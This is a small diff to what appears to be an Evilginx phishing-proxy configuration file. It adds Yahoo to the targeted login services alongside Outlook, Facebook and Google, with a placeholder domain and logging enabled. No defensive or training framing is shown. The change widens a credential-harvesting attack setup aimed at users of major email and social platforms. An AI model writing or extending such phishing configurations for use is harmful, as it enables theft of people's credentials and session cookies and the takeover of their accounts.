@@ -1,6 +1,6 @@
 {
   "domain": "your-evilginx-domain.com",
   "port": 80,
-  "phishlets": ["outlook", "facebook", "google"],
+  "phishlets": ["outlook", "facebook", "google", "yahoo"],
   "logging": true
 }
